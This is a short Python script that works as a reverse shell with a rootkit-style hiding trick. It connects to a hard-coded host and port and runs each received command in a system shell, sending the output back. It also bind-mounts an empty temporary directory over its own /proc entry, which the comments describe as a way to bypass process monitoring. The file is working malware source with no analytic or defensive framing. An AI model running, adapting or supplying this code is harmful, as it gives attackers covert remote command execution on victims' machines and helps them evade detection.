#/usr/bin/python

import os
import socket
import subprocess
import string
import time
import random

def connection(h,p):
	try:
		time.sleep(5)
		sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		sock.connect((h,p))
		while True:
			# receiving commands
			command = sock.recv(1024)
			# evaluating exit command
			if command.strip("\n") == "exit":
				sock.close()
			# processing command with subprocess
			proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
			result = proc.stdout.read() + proc.stderr.read()
			sock.send(result)
	except socket.error:
		pass

if __name__ == "__main__":
	# rootkit
	ch = string.uppercase + string.digits
	token =  "".join(random.choice(ch) for i in range(72)) # generating a random string characters token
	# gettig the actual PID
	pid = os.getpid()
	# create a tmp file 
	os.system("mkdir /tmp/{1} && mount -o bind /tmp/{1} /proc/{0}".format(pid, token)) # mount binding - bypass proc monitoring

	while True:
		host = "localhost"
		port = 8888
		connection(host,port)

	# /proc -> directory for listing OS processes (has a PID for each process)
